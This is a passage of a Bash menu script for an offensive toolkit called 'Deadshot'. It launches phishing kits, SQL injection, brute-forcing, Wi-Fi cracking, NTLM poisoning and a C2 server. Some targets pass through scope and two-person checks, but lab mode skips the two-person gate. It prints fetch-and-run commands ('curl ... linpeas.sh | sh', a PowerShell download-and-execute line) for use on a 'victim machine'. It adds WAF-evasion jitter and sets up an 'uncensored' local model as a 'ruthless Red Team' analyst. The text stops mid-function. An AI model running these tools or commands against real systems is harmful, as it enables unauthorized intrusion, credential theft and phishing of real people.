    if ! curl --fail --location --silent --show-error --proto '=https' --tlsv1.2 --retry 3 --output "$output_path" "$url"; then
        echo -e "${RED}[!] Download failed for $artifact_name.${NC}"
        return 1
    fi

    if [ -n "$expected_sha" ]; then
        actual_sha=$(sha256sum "$output_path" 2>/dev/null | awk '{print $1}')
        actual_sha=$(echo "$actual_sha" | tr '[:upper:]' '[:lower:]')
        if [ -z "$actual_sha" ] || [ "$actual_sha" != "$expected_sha" ]; then
            echo -e "${RED}[!] SHA256 mismatch for $artifact_name. Download removed.${NC}"
            rm -f "$output_path"
            return 1
        fi
    else
        echo -e "${RED}[!] WARNING: running with ALLOW_UNVERIFIED_DOWNLOADS=1 for $artifact_name.${NC}"
    fi

    return 0
}

safe_execute_downloaded_script() {
    local url="$1"
    local expected_sha="$2"
    local artifact_name="$3"
    local script_path
    local rc

    script_path=$(mktemp "/tmp/deadshot_installer.XXXXXX") || return 1
    if ! safe_download "$url" "$script_path" "$expected_sha" "$artifact_name"; then
        rm -f "$script_path"
        return 1
    fi

    chmod 700 "$script_path"
    bash "$script_path"
    rc=$?
    rm -f "$script_path"
    return $rc
}

# ==========================================
# CORE DEPENDENCIES
# ==========================================
run_requisitos() {
    clear
    echo -e "${DARK_GRAY}[*] Updating system and installing base dependencies...${NC}"
    sudo apt update && sudo apt upgrade -y
    sudo apt install -y git python3 python3-pip python3-venv pipx metasploit-framework curl php tor ruby nmap amass nuclei hydra ffuf wpscan jq macchanger wifite aircrack-ng responder hashcat ipset
    echo -e "${DARK_GRAY}[+] Core requirements installed.${NC}"
    pause_menu
}

# ==========================================
# INPUT SANITIZATION & PYTHON VENV
# ==========================================
sanitize_input() {
    local input="$1"
    # Block shell execution strings
    if [[ "$input" == *[';&|$\><`\']* ]]; then
        return 1
    # Block Flag/Parameter Injection (-oX, -sC, --help)
    elif [[ "$input" == -* ]]; then
        return 1
    fi
    return 0
}

sanitize_offensive_input() {
    local input="$1"
    if [[ -z "$input" ]]; then
        return 1
    fi
    if [[ "$input" == *[';&|$\\><`']* ]]; then
        return 1
    fi
    return 0
}

init_virtualenv() {
    if [ ! -d ".venv_deadshot" ]; then
        echo -e "${DARK_GRAY}[*] Initializing isolated Python virtual environment...${NC}"
        python3 -m venv ".venv_deadshot"
    fi
    source ".venv_deadshot/bin/activate"
}

run_zphisher() {
    prepare_tools_dir || return
    if [ ! -d "zphisher" ]; then git clone https://github.com/htr-tech/zphisher; fi
    verify_clone_commit "${TOOLS_DIR}/zphisher" "${COMMIT_PIN_ZPHISHER}" || { pause_menu; return; }
    cd zphisher && bash zphisher.sh; pause_menu
}

run_camphish() {
    prepare_tools_dir || return
    if [ ! -d "CamPhish" ]; then git clone https://github.com/techchipnet/CamPhish; fi
    verify_clone_commit "${TOOLS_DIR}/CamPhish" "${COMMIT_PIN_CAMPHISH}" || { pause_menu; return; }
    cd CamPhish && bash camphish.sh; pause_menu
}

run_amass() {
    prepare_tools_dir || return
    read -p "Target Domain (e.g., example.com): " dom
    if ! sanitize_input "$dom"; then echo -e "${RED}[!] Invalid input.${NC}"; pause_menu; return; fi
    if command -v amass >/dev/null; then amass enum -d "$dom"; else echo -e "${RED}[!] Amass not found.${NC}"; fi
    pause_menu
}

run_theharvester() {
    prepare_tools_dir || return
    init_virtualenv
    if [ ! -d "theHarvester" ]; then git clone https://github.com/laramies/theHarvester.git; fi
    verify_clone_commit "${TOOLS_DIR}/theHarvester" "${COMMIT_PIN_THEHARVESTER}" || { pause_menu; return; }
    cd theHarvester
    pip install -r requirements/base.txt 2>/dev/null
    read -p "Target Domain (e.g., example.com): " dom
    if ! sanitize_input "$dom"; then echo -e "${RED}[!] Invalid input.${NC}"; deactivate; pause_menu; return; fi
    python3 theHarvester.py -d "$dom" -b all | log_output "TheHarvester"
    deactivate
    pause_menu
}

run_sqlmap() {
    prepare_tools_dir || return
    if [ ! -d "sqlmap-dev" ]; then git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev; fi
    verify_clone_commit "${TOOLS_DIR}/sqlmap-dev" "${COMMIT_PIN_SQLMAP}" || { pause_menu; return; }
    cd sqlmap-dev
    read -p "Target URL with parameter (e.g., example.com/page.php?id=1): " alvo
    if ! sanitize_input "$alvo"; then echo -e "${RED}[!] Invalid input.${NC}"; pause_menu; return; fi
    run_isolated "SQLMap" python3 sqlmap.py -u "$alvo" --dbs --random-agent --batch
    pause_menu
}

run_phoneinfoga() {
    prepare_tools_dir || return
    if [ ! -d "PhoneInfoga_App" ]; then mkdir PhoneInfoga_App; fi
    cd PhoneInfoga_App
    if [ ! -f "phoneinfoga" ]; then
        if ! safe_execute_downloaded_script "https://raw.githubusercontent.com/sundowndev/phoneinfoga/master/support/scripts/install" "$PHONEINFOGA_INSTALL_SHA256" "PhoneInfoga installer"; then
            echo -e "${RED}[!] PhoneInfoga installation aborted due to verification failure.${NC}"
            pause_menu
            return
        fi
    fi
    read -p "Target Phone Number (+123...): " phnum
    if ! sanitize_input "$phnum"; then echo -e "${RED}[!] Invalid input.${NC}"; pause_menu; return; fi
    if [ -n "$phnum" ]; then ./phoneinfoga scan -n "$phnum"; fi
    pause_menu
}

run_sherlock() {
    prepare_tools_dir || return
    init_virtualenv
    if [ ! -d "sherlock" ]; then git clone https://github.com/sherlock-project/sherlock.git; fi
    verify_clone_commit "${TOOLS_DIR}/sherlock" "${COMMIT_PIN_SHERLOCK}" || { pause_menu; return; }
    cd sherlock
    pip install -r requirements.txt 2>/dev/null
    read -p "Target Username: " uname
    if ! sanitize_input "$uname"; then echo -e "${RED}[!] Invalid input.${NC}"; deactivate; pause_menu; return; fi
    if [ -n "$uname" ]; then python3 sherlock "$uname"; fi
    deactivate
    pause_menu
}

run_nuclei() {
    prepare_tools_dir || return
    read -p "Target IP/Domain (https://example.com): " tg
    if ! sanitize_input "$tg"; then echo -e "${RED}[!] Invalid input.${NC}"; pause_menu; return; fi
    if command -v nuclei >/dev/null; then
        # Evasion Tactics: Rate limiting and Random User-Agent
        local nuclei_ua
        nuclei_ua=$(get_random_ua)
        nuclei -u "$tg" -rl "${NUCLEI_RATE_LIMIT:-150}" -H "User-Agent: $nuclei_ua" | log_output "Nuclei"
    else 
        echo -e "${RED}[!] Nuclei not found.${NC}"
    fi
    pause_menu
}

run_nikto() {
    prepare_tools_dir || return
    if [ ! -d "nikto" ]; then git clone https://github.com/sullo/nikto.git; fi
    verify_clone_commit "${TOOLS_DIR}/nikto" "${COMMIT_PIN_NIKTO}" || { pause_menu; return; }
    cd nikto
    read -p "Target Web Server URL: " urlt
    if ! sanitize_input "$urlt"; then echo -e "${RED}[!] Invalid input.${NC}"; pause_menu; return; fi
    run_isolated "Nikto" perl program/nikto.pl -h "$urlt"
    pause_menu
}

run_wpscan() {
    prepare_tools_dir || return
    read -p "Target WordPress URL: " wp_url
    if ! sanitize_input "$wp_url"; then echo -e "${RED}[!] Invalid input.${NC}"; pause_menu; return; fi
    if command -v wpscan >/dev/null; then
        run_isolated "WPScan" wpscan --url "$wp_url" --enumerate u,vp,vt | log_output "WPScan"
    else
        echo -e "${RED}[!] WPScan not found.${NC}"
    fi
    pause_menu
}

run_rustscan() {
    prepare_tools_dir || return
    if ! command -v rustscan >/dev/null; then
        if ! safe_download "https://github.com/RustScan/RustScan/releases/download/2.0.1/rustscan_2.0.1_amd64.deb" "rustscan.deb" "$RUSTSCAN_DEB_SHA256" "RustScan package"; then
            pause_menu
            return
        fi
        sudo dpkg -i rustscan.deb
        rm -f rustscan.deb
    fi
    read -p "Target IP for fast scanning: " t_ip
    if ! sanitize_input "$t_ip"; then echo -e "${RED}[!] Invalid input.${NC}"; pause_menu; return; fi
    
    run_isolated "RustScan" rustscan -a "$t_ip" -- -A -sC "${DEFAULT_NMAP_PORTS:--p-}" | log_output "RustScan"
    pause_menu
}

run_hydra() {
    prepare_tools_dir || return
    read -p "Wordlist path: " wordl
    read -p "Target User: " usr
    read -p "Target Protocol & URL (e.g., ssh://192.168.1.1): " target_f
    
    if ! sanitize_offensive_input "$wordl" || ! sanitize_offensive_input "$usr" || ! sanitize_offensive_input "$target_f"; then
        echo -e "${RED}[!] Invalid input detected.${NC}"; pause_menu; return
    fi

    check_arbiter_policy "action.engine.hydra" "$target_f" || { pause_menu; return; }

    if command -v hydra >/dev/null; then 
        run_isolated "Hydra" hydra -l "$usr" -P "$wordl" "$target_f"
    else 
        echo -e "${RED}[!] Hydra not found.${NC}"
    fi
    pause_menu
}

run_ffuf() {
    prepare_tools_dir || return
    read -p "Target URL ending with FUZZ: " fz_site
    read -p "Directory wordlist path: " dir_w
    
    if ! sanitize_offensive_input "$fz_site" || ! sanitize_offensive_input "$dir_w"; then
        echo -e "${RED}[!] Invalid input detected.${NC}"; pause_menu; return
    fi

    check_arbiter_policy "action.engine.ffuf" "$fz_site" || { pause_menu; return; }

    if command -v ffuf >/dev/null; then 
        # Tactic JITTER: Obfuscates timing and signatures to bypass WAF logic loops
        local ffuf_ua ffuf_jitter
        ffuf_ua=$(get_random_ua)
        ffuf_jitter=$(get_runtime_jitter)
        run_isolated "Ffuf" ffuf -w "$dir_w" -u "$fz_site" -H "User-Agent: $ffuf_ua" -p "$ffuf_jitter" -c | log_output "Ffuf"
    else 
        echo -e "${RED}[!] Ffuf not found.${NC}"
    fi
    pause_menu
}

run_seeker() {
    prepare_tools_dir || return
    if [ ! -d "seeker" ]; then git clone https://github.com/thewhiteh4t/seeker.git; fi
    verify_clone_commit "${TOOLS_DIR}/seeker" "${COMMIT_PIN_SEEKER}" || { pause_menu; return; }
    cd seeker
    bash install.sh
    python3 seeker.py
    pause_menu
}

run_torproxy() {
    prepare_tools_dir || return
    if [ ! -d "Auto_Tor_IP_changer" ]; then git clone https://github.com/FDX100/Auto_Tor_IP_changer.git; fi
    verify_clone_commit "${TOOLS_DIR}/Auto_Tor_IP_changer" "${COMMIT_PIN_AUTO_TOR}" || { pause_menu; return; }
    cd Auto_Tor_IP_changer
    sudo python3 install.py
    pause_menu
}

run_netexec() {
    prepare_tools_dir || return
    if ! command -v netexec >/dev/null; then
        echo -e "${DARK_GRAY}[*] Installing NetExec via pipx...${NC}"
        pipx install netexec 2>/dev/null || sudo apt install -y netexec
    fi
    read -p "Target Windows Network (e.g., 192.168.1.0/24): " tg_smb
    if ! sanitize_input "$tg_smb"; then echo -e "${RED}[!] Invalid input.${NC}"; pause_menu; return; fi
    if [ -n "$tg_smb" ]; then
        echo -e "${DARK_GRAY}[*] Initiating SMB scanning...${NC}"
        run_isolated "NetExec" netexec smb "$tg_smb"
    fi
    pause_menu
}

run_sliver() {
    require_two_person_auth "Sliver" || { pause_menu; return; }
    prepare_tools_dir || return
    if [ ! -d "sliver" ]; then
        mkdir sliver; cd sliver
        echo -e "${DARK_GRAY}[*] Downloading Sliver C2 framework...${NC}"
        if ! safe_download "https://github.com/BishopFox/sliver/releases/latest/download/sliver-server_linux" "sliver-server" "$SLIVER_SERVER_SHA256" "Sliver server"; then
            pause_menu
            return
        fi
        chmod +x sliver-server
    else
        cd sliver
    fi
    echo -e "${DARK_GRAY}[*] Loading Sliver Server...${NC}"
    run_isolated "Sliver" ./sliver-server
    pause_menu
}

run_metasploit() {
    prepare_tools_dir || return
    require_two_person_auth "Metasploit" || { pause_menu; return; }
    if command -v msfconsole >/dev/null; then
        echo -e "${DARK_GRAY}[*] Loading Metasploit Framework...${NC}"
        msfconsole -q
    else
        echo -e "${RED}[!] Metasploit not found. Install requirements.${NC}"
    fi
    pause_menu
}

# ==========================================
# PHYSICAL & ELITE POST-EXPLOIT (V9)
# ==========================================
run_wifite() {
    clear
    require_two_person_auth "Wifite" || { pause_menu; return; }
    echo -e "${RED}[!] WARNING: Wifite will put your interface in Monitor Mode!${NC}"
    echo -e "${DARK_GRAY}[*] Internet connection will be dropped during the attack.${NC}"
    sleep 2
    if command -v wifite >/dev/null; then 
        run_isolated "Wifite" sudo wifite --kil
    else 
        echo -e "${RED}[!] Wifite not found. Run Install Requirements.${NC}"
    fi
    pause_menu
}

run_responder() {
    clear
    require_two_person_auth "Responder" || { pause_menu; return; }
    read -p "Local Interface to Poison (e.g., eth0, wlan0): " iface_rsp
    if ! sanitize_input "$iface_rsp"; then echo -e "${RED}[!] Invalid input.${NC}"; pause_menu; return; fi
    
    if command -v responder >/dev/null; then
        echo -e "${DARK_GRAY}[*] Flooding LAN & Listening for NTLM Authentication from Windows...${NC}"
        run_isolated "Responder" sudo responder -I "$iface_rsp" -dwv
    else
        echo -e "${RED}[!] Responder not found. Run Install Requirements.${NC}"
    fi
    pause_menu
}

run_hashcat() {
    prepare_tools_dir || return
    read -p "Path to the extracted Hash file: " hash_fl
    read -p "Hashcat Mode Type (e.g., 1000 for NTLM, 0 for MD5): " h_mode
    read -p "Wordlist path (e.g., /usr/share/wordlists/rockyou.txt): " h_wlist
    
    if command -v hashcat >/dev/null; then
        echo -e "${DARK_GRAY}[*] Initializing GPU Crackers offline...${NC}"
        run_isolated "Hashcat" hashcat -m "$h_mode" "$hash_fl" "$h_wlist" --force -O | log_output "Hashcat"
    else
        echo -e "${RED}[!] Hashcat not found.${NC}"
    fi
    pause_menu
}

run_peas_server() {
    prepare_tools_dir || return
    echo -e "${DARK_GRAY}[*] Downloading Privilege Escalation Suites (LinPEAS/WinPEAS)...${NC}"
    
    mkdir -p Peas_Payloads
    cd Peas_Payloads
    if [ ! -f "linpeas.sh" ]; then
        if ! safe_download "https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh" "linpeas.sh" "$LINPEAS_SHA256" "LinPEAS"; then
            pause_menu
            return
        fi
    fi
    if [ ! -f "winPEASx64.exe" ]; then
        if ! safe_download "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe" "winPEASx64.exe" "$WINPEAS_SHA256" "WinPEAS"; then
            pause_menu
            return
        fi
    fi
    
    MY_LIP=$(ip route get 8.8.8.8 2>/dev/null | awk '{print $7}')
    echo -e "${RED}\n[!] LAUNCH THIS ON THE VICTIM MACHINE TO ESCALATE PRIVILEGES:${NC}"
    echo -e "${DARK_GRAY}Linux: curl http://$MY_LIP:8080/linpeas.sh | sh${NC}"
    echo -e "${DARK_GRAY}Windows (PS): Invoke-WebRequest -Uri http://$MY_LIP:8080/winPEASx64.exe -OutFile .\winPEAS.exe; .\winPEAS.exe${NC}\n"
    
    echo -e "${DARK_GRAY}[*] Starting Clandestine HTTP Server on port 8080... (Ctrl+C to close)${NC}"
    python3 -m http.server 8080
    cd ..
    pause_menu
}

clean_tools_dir() {
    clear
    require_two_person_auth "PurgeSandbox" || { pause_menu; return; }
    if [ -d "$TOOLS_DIR" ] && [ "$TOOLS_DIR" = "${SCRIPT_DIR}/Tools" ]; then
        local quarantine_dir="${SCRIPT_DIR}/Quarantine"
        local quarantine_name="Tools_purge_$(date +%Y%m%d_%H%M%S)"
        mkdir -p -- "$quarantine_dir" 2>/dev/null || true
        mv -- "$TOOLS_DIR" "${quarantine_dir}/${quarantine_name}" 2>/dev/null || true
        mkdir -p -- "$TOOLS_DIR"
        echo -e "${DARK_GRAY}[+] Tools directory quarantined safely.${NC}"
    else
        echo -e "${RED}[!] Critical error: invalid tools directory path.${NC}"
    fi
    pause_menu
}

# ==========================================
# BLUE TEAM: ACTIVE DEFENSE SHIELD
# ==========================================
run_shield() {
    clear
    echo -e "${DARK_GRAY}[*] Launching Deadshot Shield (Active Defense)...${NC}"
    if [ -x "$SCRIPT_DIR/deadshot_shield" ]; then
        "$SCRIPT_DIR/deadshot_shield"
    else
        bash "$SCRIPT_DIR/deadshot_shield.sh"
    fi
    pause_menu
}

# ==========================================
# LOCAL AI ASSISTANT & LIVE INTEL
# ==========================================
run_ai_assistant() {
    clear
    echo -e "${RED}             [ DEADSHOT AI ASSISTANT ]${NC}"
    echo -e "${DARK_GRAY}[*] Initializing local LLM engine...${NC}"
    
    # === PHASE 1: Silent Auto-Install ===
    if ! command -v ollama >/dev/null; then
        echo -e "${DARK_GRAY}[*] Ollama not detected. Auto-installing silently...${NC}"
        if ! safe_execute_downloaded_script "https://ollama.com/install.sh" "$OLLAMA_INSTALL_SHA256" "Ollama installer"; then
            echo -e "${RED}[!] Auto-install aborted due to verification failure.${NC}"
            pause_menu
            return
        fi
        if ! command -v ollama >/dev/null; then
            echo -e "${RED}[!] Auto-install failed. Check your internet connection.${NC}"
            pause_menu
            return
        fi
        echo -e "${DARK_GRAY}[+] Ollama engine installed successfully.${NC}"
    fi
    
    # === PHASE 2: Background Daemon Ignition ===
    if ! pgrep -x "ollama" >/dev/null; then
        echo -e "${DARK_GRAY}[*] Igniting Ollama daemon in background...${NC}"
        ollama serve >/dev/null 2>&1 &
        sleep 3
    fi
    
    # === PHASE 3: Auto-Pull Model if Missing ===
    if ! ollama list 2>/dev/null | grep -q "dolphin-phi"; then
        echo -e "${DARK_GRAY}[*] Pulling 'dolphin-phi' uncensored model (first run only)...${NC}"
        ollama pull dolphin-phi
    fi
    
    # === PHASE 4: Tactical Context Injection (Last Report) ===
    LATEST_REPORT=""
    if [ -d "$SCRIPT_DIR/Reports" ]; then
        LATEST_REPORT=$(ls -t "$SCRIPT_DIR/Reports"/*.txt 2>/dev/null | head -n 1)
    fi
    
    if [ -n "$LATEST_REPORT" ]; then
        REPORT_NAME=$(basename "$LATEST_REPORT")
        REPORT_SNIPPET=$(head -c 4000 "$LATEST_REPORT")
        echo -e "${RED}[!] TACTICAL CONTEXT LOADED: ${REPORT_NAME}${NC}"
        echo -e "${DARK_GRAY}[*] The AI is analyzing the report... please wait.${NC}"
        
        # We use a system prompt and the report data, then enter interactive mode
        ollama run "$OLLAMA_MODEL" "SYSTEM: You are a ruthless Red Team AI analyst. Analyze this report for vulnerabilities and next steps. Report: $REPORT_NAME. Data: $REPORT_SNIPPET"
        
        echo -e "\n${DARK_GRAY}[*] Initial analysis complete. Dropping into interactive tactical chat...${NC}"
        echo -e "${DARK_GRAY}[*] Type /bye to exit.${NC}\n"
        ollama run "$OLLAMA_MODEL"
    else
        echo -e "${DARK_GRAY}[*] No previous reports found. Starting clean tactical session.${NC}"
        echo -e "${DARK_GRAY}[*] Type /bye to exit.${NC}"
        echo ""
        ollama run "$OLLAMA_MODEL"
    fi
    
    clear
    echo -e "${DARK_GRAY}[*] AI Assistant terminated. Returning to framework.${NC}"
    pause_menu
}

run_live_intel() {
    clear
    if ! command -v jq >/dev/null || ! command -v curl >/dev/null; then
        echo -e "${RED}[!] jq or curl missing. Install core dependencies.${NC}"
        pause_menu
        return
    fi

    echo -e "${DARK_GRAY}[*] Querying sources via Tor SOCKS5...${NC}"
    sleep 2
    
    PROXY_URL="${PROXY_ADDR:-socks5h://127.0.0.1:9050}"

    INTEL_UA_1=$(get_random_ua)
    INTEL_UA_2=$(get_random_ua)
    
    echo -e "${RED}\n[=] RECENT CVE EXPLOITS (GITHUB):${NC}"
    curl -x "$PROXY_URL" -s -H "User-Agent: $INTEL_UA_1" "https://api.github.com/search/repositories?q=CVE-2024&sort=updated&order=desc" 2>/dev/null | jq -r '.items[0:3] | " [X] \(.name): \(.description)"'
    
    echo -e "${RED}\n[=] ACTIVE PUBLIC BUG BOUNTIES:${NC}"
    curl -x "$PROXY_URL" -s -H "User-Agent: $INTEL_UA_2" "https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/main/data/hackerone_data.json" 2>/dev/null | jq -r '.[0:3] | " [+] \(.url)"'
    
    echo -e "\n${DARK_GRAY}[+] Intel gathering complete.${NC}"
    pause_menu
}

# ==========================================
# AI COMMAND CENTER (SENTINEL / OPERATOR / RUNTIME / ARBITER)
# ==========================================
run_agent_engine() {
    local agent_bin="$SCRIPT_DIR/deadshot_agents"
    local agent_script="$SCRIPT_DIR/deadshot_agents.py"
    local agent_bytecode="$SCRIPT_DIR/deadshot_agents.pyc"

    if [ -x "$agent_bin" ]; then
        "$agent_bin" "$@"
        return $?
    fi

    if [ -f "$agent_script" ] || [ -f "$agent_bytecode" ]; then
        if ! command -v python3 >/dev/null 2>&1; then
            echo -e "${RED}[!] Python3 is required to run Deadshot Agents.${NC}"
            return 1
        fi
        if [ -f "$agent_script" ]; then
            python3 "$agent_script" "$@"
        else
            python3 "$agent_bytecode" "$@"
        fi
        return $?
    fi

    echo -e "${RED}[!] Deadshot agent engine not found (deadshot_agents/deadshot_agents.py).${NC}"
    return 1
}

run_agent_runtime() {
    clear
    echo -e "${RED}             [ RUNTIME AGENT ]${NC}"
    echo -e "${DARK_GRAY}[*] Real-time sentinel monitor loop with heartbeat + lock guard.${NC}"
    echo ""

    read -p "Interval seconds [default 20, min 5]: " interval_in
    read -p "Cycles [default 5, 0 = run until Ctrl+C]: " cycles_in

    local args=("runtime")
    if [ -n "$interval_in" ]; then
        args+=("--interval" "$interval_in")
    fi
    if [ -n "$cycles_in" ]; then
        args+=("--cycles" "$cycles_in")
    fi

    echo ""
    echo "1) Monitor only"
    echo "2) Monitor + auto-response"
    read -p "Mode [1/2]: " mode_sel

    if [ "$mode_sel" = "2" ]; then
        read -p "Type YES to approve auto-response (optional): " approval
        if [ "$approval" = "YES" ]; then
            args+=("--act" "--approve" "yes")
        else
            args+=("--act")
        fi
    fi

    run_agent_engine "${args[@]}"
    pause_menu
}

run_agent_sentinel() {
    clear
    echo -e "${RED}             [ SENTINEL AGENT ]${NC}"
    echo -e "${DARK_GRAY}[*] Telemetry risk scoring + policy-gated auto-response.${NC}"
    echo ""
    echo "1) Analyze only"
    echo "2) Analyze + auto-response"
    read -p "Mode [1/2]: " mode_sel

    local args=("sentinel")
    if [ "$mode_sel" = "2" ]; then
        read -p "Type YES to approve auto-response (optional): " approval
        if [ "$approval" = "YES" ]; then
            args+=("--act" "--approve" "yes")
        else
            args+=("--act")
        fi
    fi

    run_agent_engine "${args[@]}"
    pause_menu
}

run_agent_operator() {
    clear
    echo -e "${RED}             [ OPERATOR AGENT ]${NC}"
    echo -e "${DARK_GRAY}[*] Objective-driven planner with Arbiter enforcement.${NC}"
    echo ""

    read -p "Operational objective: " objective
    if [ -z "$objective" ]; then
        echo -e "${RED}[!] Objective cannot be empty.${NC}"
        pause_menu
        return
    fi

    local args=("operator" "--objective" "$objective")

    echo ""
    echo "1) Plan only (dry-run)"
    echo "2) Execute approved plan"
    read -p "Execution mode [1/2]: " exec_mode

    if [ "$exec_mode" = "2" ]; then
        read -p "Type YES to approve this run: " approval
        if [ "$approval" != "YES" ]; then
            echo -e "${DARK_GRAY}[*] Approval not granted. Running dry-run plan only.${NC}"
        else
            args+=("--execute" "--approve" "yes")
        fi
    fi

    run_agent_engine "${args[@]}"
    pause_menu
}

run_agent_arbiter() {
    clear
    echo -e "${RED}             [ ARBITER AGENT ]${NC}"
    echo -e "${DARK_GRAY}[*] Policy gate and audit trail controller.${NC}"
    echo ""

    echo "1) Show policy + audit summary"
    echo "2) Check a specific action gate"
    read -p "Selection [1/2]: " arb_mode

    if [ "$arb_mode" = "2" ]; then
        read -p "Action ID (example: action.shield.ensure_daemon): " action_id
        if [ -z "$action_id" ]; then
            echo -e "${RED}[!] Action ID cannot be empty.${NC}"
            pause_menu
            return
        fi
        run_agent_engine arbiter --check "$action_id"
    else
        run_agent_engine arbiter --summary --show-policy
    fi

    pause_menu
}

# ==========================================
# TEXTUAL UI DISPATCHER (FRONT-END INIT)
# ==========================================


check_arbiter_policy() {
    local action_id="$1"
    local raw_target="$2"
    local scope_file="${SCRIPT_DIR}/deadshot_scope.json"

    local target
    target=$(printf '%s' "$raw_target" \
        | sed -E 's|^[a-zA-Z+.-]+://||; s|/.*||; s|:[0-9]+$||')

    if [[ -z "$target" ]]; then
        echo -e "${RED}[!] SCOPE: target vazio após parse — bloqueado (${action_id}).${NC}"
        return 1
    fi

    if [[ ! -f "$scope_file" ]]; then
        echo -e "${RED}[!] SCOPE: deadshot_scope.json não encontrado — bloqueado (${action_id}).${NC}"
        return 1
    fi

    local result
    result=$(python3 - "$scope_file" "$target" "$action_id" <<'PYEOF'
import sys, json, ipaddress
from datetime import datetime, timezone

scope_file, target, action_id = sys.argv[1], sys.argv[2], sys.argv[3]

try:
    with open(scope_file) as fh:
        scope = json.load(fh)
except Exception as e:
    print(f"ERROR:cannot parse scope file: {e}")
    sys.exit(0)

expires = scope.get("expires_utc", "")
if expires:
    try:
        exp_dt = datetime.fromisoformat(expires.replace("Z", "+00:00"))
        if datetime.now(timezone.utc) > exp_dt:
            print(f"DENIED:engagement expirou em {expires}")
            sys.exit(0)
    except Exception:
        print("ERROR:expires_utc formato inválido")
        sys.exit(0)

allowed = scope.get("allowed_targets", [])
eid = scope.get("engagement_id", "unknown")

target_ip = None
try:
    target_ip = ipaddress.ip_address(target)
except ValueError:
    pass

for entry in allowed:
    if target == entry:
        print(f"ALLOWED:{eid}")
        sys.exit(0)
    if entry.startswith("*.") and target.endswith(entry[1:]):
        print(f"ALLOWED:{eid}")
        sys.exit(0)
    if target_ip:
        try:
            if target_ip in ipaddress.ip_network(entry, strict=False):
                print(f"ALLOWED:{eid}")
                sys.exit(0)
        except ValueError:
            pass

print(f"DENIED:{target} fora de scope [{eid}]")
PYEOF
    )

    local status="${result%%:*}"
    local detail="${result#*:}"

    case "$status" in
        ALLOWED)
            echo -e "${DARK_GRAY}[*] Scope OK [${detail}]: ${target} — ${action_id}${NC}"
            return 0
            ;;
        DENIED)
            echo -e "${RED}[!] SCOPE NEGADO: ${detail}${NC}"
            return 1
            ;;
        ERROR)
            echo -e "${RED}[!] SCOPE ERRO: ${detail}${NC}"
            return 1
            ;;
        *)
            echo -e "${RED}[!] SCOPE: resultado inesperado — bloqueado (${action_id}).${NC}"
            return 1
            ;;
    esac
}

require_two_person_auth() {
    local module_name="$1"
    local token_file="${SCRIPT_DIR}/.tpi_token"
    local token_ttl="${DEADSHOT_TPI_TTL_SEC:-300}"

    if [[ "${DEADSHOT_PROD_MODE:-0}" != "1" ]]; then
        echo -e "${DARK_GRAY}[*] TPI: lab mode — ${module_name} autorizado sem token.${NC}"
        return 0
    fi

    # Verifica token válido em cache
    if [[ -f "$token_file" ]]; then
        local result
        result=$(python3 - "$token_file" "$token_ttl" << 'TPIEOF'
import sys, json, time, hashlib, os
token_file, ttl = sys.argv[1], int(sys.argv[2])
try:
    with open(token_file) as f:
        data = json.load(f)
    age = int(time.time()) - int(data.get("issued_at", 0))
    if age > ttl:
        print(f"EXPIRED:{age}s > {ttl}s")
        sys.exit(0)
    secret = os.environ.get("DEADSHOT_TPI_SECRET")
    if not secret:
        print("ERROR:secret nao definida")
        sys.exit(0)
    stored = data.get("token_value","")
    issued_at = int(data.get("issued_at", 0))
    base = data.get("module","") + secret + str(issued_at // 60)
    expected = hashlib.sha256(base.encode()).hexdigest()[:16]
    if stored != expected:
        print("INVALID:HMAC mismatch")
    else:
        print(f"VALID:{data.get('issued_by','unknown')} ({age}s ago)")
except Exception as e:
    print(f"ERROR:{e}")
TPIEOF
        )
        local tpi_status="${result%%:*}"
        if [[ "$tpi_status" == "VALID" ]]; then
            echo -e "${DARK_GRAY}[*] TPI: token válido — ${module_name} autorizado. ${result#*:}${NC}"
            return 0
        fi
    fi

    echo -e "${RED}[!] TWO-PERSON INTEGRITY: ${module_name} requer autorização.${NC}"
    echo -e "${DARK_GRAY}[*] Um segundo operador deve gerar o token de autorização.${NC}"
    echo -e "${DARK_GRAY}[*] Comando: sudo deadshot_tpi_approve '${module_name}' '<operador>'${NC}"
    echo ""
    read -p "Token de autorização: " tpi_input

    if [[ -z "$tpi_input" ]]; then
        echo -e "${RED}[!] TPI: token vazio — ${module_name} bloqueado.${NC}"
        return 1
    fi

    local expected
    expected=$(python3 -c "
import hashlib, time, os
secret = os.environ.get('DEADSHOT_TPI_SECRET')
if not secret: exit(1)
base = '${module_name}' + secret + str(int(time.time()) // 60)
print(hashlib.sha256(base.encode()).hexdigest()[:16])
" 2>/dev/null)

    if [[ "$tpi_input" != "$expected" ]]; then
        echo -e "${RED}[!] TPI: token inválido — ${module_name} bloqueado.${NC}"
        return 1
    fi

    python3 -c "
import json, time, pathlib
pathlib.Path('${token_file}').write_text(json.dumps({
    'module': '${module_name}',
    'issued_at': int(time.time()),
    'issued_by': __import__('os').environ.get('USER', 'unknown')
}))
" 2>/dev/null
    echo -e "${DARK_GRAY}[*] TPI: autorizado — token válido por ${token_ttl}s.${NC}"
    return 0
}
engine_policy_gate() {
    local cmd="$1"

    # === DEAD MAN'S SWITCH ===
    local heartbeat_file="${SCRIPT_DIR}/Reports/Agent_Runtime_Heartbeat.json"
    local max_age="${DEADSHOT_HEARTBEAT_MAX_AGE_SEC:-120}"
    if [[ -f "$heartbeat_file" ]]; then
        local hb_result
        hb_result=$(python3 - "$heartbeat_file" "$max_age" << 'HBEOF'
import sys, json
from datetime import datetime, timezone
hb_path, max_age = sys.argv[1], int(sys.argv[2])
try:
    with open(hb_path) as f:
        hb = json.load(f)
    ts = hb.get('timestamp', '')
    if not ts:
        print('STALE:heartbeat sem timestamp')
        sys.exit(0)
    hb_dt = datetime.fromisoformat(ts.replace('Z', '+00:00'))
    age = int((datetime.now(timezone.utc) - hb_dt).total_seconds())
    if age > max_age:
        print(f'STALE:heartbeat com {age}s de idade (max {max_age}s)')
    else:
        print(f'ALIVE:{age}s')
except Exception as e:
    print(f'ERROR:{e}')
HBEOF
        )
        local hb_status="${hb_result%%:*}"
        local hb_detail="${hb_result#*:}"
        if [[ "$hb_status" == "STALE" ]]; then
            if [[ "${DEADSHOT_PROD_MODE:-0}" == "1" ]]; then
                echo -e "${RED}[!] DEAD MAN'S SWITCH: ${hb_detail} — bloqueado em PROD_MODE.${NC}"
                return 1
            else
                echo -e "${DARK_GRAY}[!] DEAD MAN'S SWITCH: ${hb_detail} — lab mode, a continuar.${NC}"
